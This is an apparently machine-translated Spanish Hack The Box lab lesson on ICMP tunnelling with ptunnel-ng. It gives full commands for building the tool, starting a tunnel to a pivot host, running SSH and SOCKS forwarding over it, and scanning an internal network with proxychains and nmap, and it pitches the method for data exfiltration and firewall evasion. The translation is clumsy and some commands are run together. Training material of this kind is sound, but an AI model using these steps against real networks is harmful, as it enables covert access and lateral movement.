# ICMP Tunneling with SOCKS

El túnel ICMP encapsula su tráfico dentro de`ICMP packets`que contiene`echo requests`y`responses`. El túnel ICMP solo funcionaría cuando las respuestas de ping se permitan dentro de una red de firewalled. Cuando un host dentro de una red de firewalled puede hacer ping a un servidor externo, puede encapsular su tráfico dentro de la solicitud de ping echo y enviarlo a un servidor externo. El servidor externo puede validar este tráfico y enviar una respuesta apropiada, que es extremadamente útil para la exfiltración de datos y la creación de túneles de pivote a un servidor externo.

Usaremos el[ptunnel-ng](https://github.com/utoni/ptunnel-ng)Herramienta para crear un túnel entre nuestro servidor Ubuntu y nuestro host de ataque. Una vez que se cree un túnel, podremos representar nuestro tráfico a través del`ptunnel-ng client`. Podemos comenzar el`ptunnel-ng server`en el host de pivote objetivo. Comencemos configurando Ptunnel-Ng.

---

# **Configurar y usar ptunnel-ng**

Si Ptunnel-NG no está en nuestro host de ataque, podemos clonar el proyecto usando GIT.

### **Clonación ptunnel-ng**

Túnel ICMP con calcetines

```
xnoxos@htb[/htb]$ git clone https://github.com/utoni/ptunnel-ng.git
```

Una vez que el repositorio ptunnel-ng se clona a nuestro anfitrión de ataque, podemos ejecutar el`autogen.sh`Script ubicado en la raíz del directorio ptunnel-ng.

### **Construcción de ptunnel-ng con autogen.sh**

Túnel ICMP con calcetines

```
xnoxos@htb[/htb]$ sudo ./autogen.sh
```

Después de ejecutar Autogen.sh, Ptunnel-NG se puede usar desde el cliente y el lado del servidor. Ahora tendremos que transferir el repositorio de nuestro host de ataque al host Target. Como en secciones anteriores, podemos usar SCP para transferir los archivos. Si queremos transferir todo el repositorio y los archivos contenidos en el interior, necesitaremos usar el`-r`Opción con SCP.

### **Enfoque alternativo para construir un binario estático**

Túnel ICMP con calcetines

```
xnoxos@htb[/htb]$ sudo apt install automake autoconf -yxnoxos@htb[/htb]$ cd ptunnel-ng/xnoxos@htb[/htb]$ sed -i '$s/.*/LDFLAGS=-static "${NEW_WD}\/configure" --enable-static $@ \&\& make clean \&\& make -j${BUILDJOBS:-4} all/' autogen.shxnoxos@htb[/htb]$ ./autogen.sh
```

### **Transferir Ptunnel-Ng al host de pivote**

Túnel ICMP con calcetines

```
xnoxos@htb[/htb]$ scp -r ptunnel-ng ubuntu@10.129.202.64:~/
```

Con Ptunnel-NG en el host de destino, podemos iniciar el lado del servidor del túnel ICMP usando el comando directamente a continuación.

### **Inicio del servidor Ptunnel-NG en el host de destino**

Túnel ICMP con calcetines

```
ubuntu@WEB01:~/ptunnel-ng/src$ sudo ./ptunnel-ng -r10.129.202.64 -R22[sudo] password for ubuntu:
./ptunnel-ng: /lib/x86_64-linux-gnu/libselinux.so.1: no version information available (required by ./ptunnel-ng)
[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Forwarding incoming ping packets over TCP.
[inf]: Ping proxy is listening in privileged mode.
[inf]: Dropping privileges now.

```

La dirección IP siguiente`-r`Debería ser la IP de la caja de salto que queremos que Ptunnel-Ng acepte conexiones. En este caso, cualquier IP es accesible de nuestro host de ataque sería lo que usaríamos. Nos beneficiaríamos de usar este mismo pensamiento y consideración durante un compromiso real.

De vuelta en el host de ataque, podemos intentar conectarnos al servidor Ptunnel-NG (`-p <ipAddressofTarget>`) pero asegúrese de que esto suceda a través del puerto local 2222 (`-l2222`). Connecting through local port 2222 allows us to send traffic through the ICMP tunnel.

### **Conectarse al servidor Ptunnel-NG desde el host de ataque**

Túnel ICMP con calcetines

```
xnoxos@htb[/htb]$ sudo ./ptunnel-ng -p10.129.202.64 -l2222 -r10.129.202.64 -R22[inf]: Starting ptunnel-ng 1.42.
[inf]: (c) 2004-2011 Daniel Stoedle, <daniels@cs.uit.no>
[inf]: (c) 2017-2019 Toni Uhlig,     <matzeton@googlemail.com>
[inf]: Security features by Sebastien Raveau, <sebastien.raveau@epita.fr>
[inf]: Relaying packets from incoming TCP streams.

```

Con el túnel Ptunnel-NG ICMP establecido correctamente, podemos intentar conectarnos al objetivo utilizando SSH a través del puerto local 2222 (`-p2222`).

### **Túnelando una conexión SSH a través de un túnel ICMP**

Túnel ICMP con calcetines

```
xnoxos@htb[/htb]$ ssh -p2222 -lubuntu 127.0.0.1ubuntu@127.0.0.1's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Wed 11 May 2022 03:10:15 PM UTC

  System load:             0.0
  Usage of /:              39.6% of 13.72GB
  Memory usage:            37%
  Swap usage:              0%
  Processes:               183
  Users logged in:         1
  IPv4 address for ens192: 10.129.202.64
  IPv6 address for ens192: dead:beef::250:56ff:feb9:52eb
  IPv4 address for ens224: 172.16.5.129

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

144 updates can be applied immediately.
97 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable

Last login: Wed May 11 14:53:22 2022 from 10.10.14.18
ubuntu@WEB01:~$
```

Si está configurado correctamente, podremos ingresar credenciales y tener una sesión SSH durante todo el túnel ICMP.

En el lado del cliente y el servidor de la conexión, notaremos que Ptunnel-NG nos ofrece registros de sesión y estadísticas de tráfico asociadas con el tráfico que pasa a través del túnel ICMP. Esta es una forma en que podemos confirmar que nuestro tráfico está pasando de un cliente a otro utilizando ICMP.

### **Ver estadísticas de tráfico del túnel**

Túnel ICMP con calcetines

```
inf]: Incoming tunnel request from 10.10.14.18.
[inf]: Starting new session to 10.129.202.64:22 with ID 20199
[inf]: Received session close from remote peer.
[inf]:
Session statistics:
[inf]: I/O:   0.00/  0.00 mb ICMP I/O/R:      248/      22/       0 Loss:  0.0%
[inf]:

```

También podemos usar este túnel y SSH para realizar el reenvío de puertos dinámicos para permitirnos usar proxychains de varias maneras.

### **Habilitando el reenvío de puertos dinámicos sobre SSH**

Túnel ICMP con calcetines

```
xnoxos@htb[/htb]$ ssh -D 9050 -p2222 -lubuntu 127.0.0.1ubuntu@127.0.0.1's password:
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-91-generic x86_64)
<snip>

```

Podríamos usar proxyChains con NMAP para escanear objetivos en la red interna (172.16.5.x). Según nuestros descubrimientos, podemos intentar conectarnos al objetivo.

### **ProxyCheining a través del túnel ICMP**

Túnel ICMP con calcetines

```
xnoxos@htb[/htb]$ proxychains nmap -sV -sT 172.16.5.19 -p3389ProxyChains-3.1 (http://proxychains.sf.net)
Starting Nmap 7.92 ( https://nmap.org ) at 2022-05-11 11:10 EDT
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:80-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
|S-chain|-<>-127.0.0.1:9050-<><>-172.16.5.19:3389-<><>-OK
Nmap scan report for 172.16.5.19
Host is up (0.12s latency).

PORT     STATE SERVICE       VERSION
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 8.78 seconds

```

---

# **Consideraciones de análisis de tráfico de red**

Es importante que confirmemos que las herramientas que estamos utilizando están funcionando como se anuncia y que hemos configurado y las estamos operando correctamente. En el caso del tráfico de túneles a través de diferentes protocolos enseñados en esta sección con túneles ICMP, podemos beneficiarnos de analizar el tráfico que generamos con un analizador de paquetes como`Wireshark`. Eche un vistazo al clip corto a continuación.

![](https://academy.hackthebox.com/storage/modules/158/analyzingTheTraffic.gif)

En la primera parte de este clip, se establece una conexión a través de SSH sin usar el túnel ICMP. Podemos notar que`TCP` & `SSHv2`Se captura el tráfico.

El comando utilizado en el clip:`ssh ubuntu@10.129.202.64`

En la segunda parte de este clip, se establece una conexión a través de SSH utilizando el túnel ICMP. Observe el tipo de tráfico que se captura cuando se realiza.

Comando utilizado en el clip:`ssh -p2222 -lubuntu 127.0.0.1`

---

Nota: Al generar su objetivo, le pedimos que espere de 3 a 5 minutos hasta que todo el laboratorio con todas las configuraciones esté configurada para que la conexión a su objetivo funcione sin problemas.

Nota: Considere las versiones de GLIBC, asegúrese de estar a la par con la del objetivo.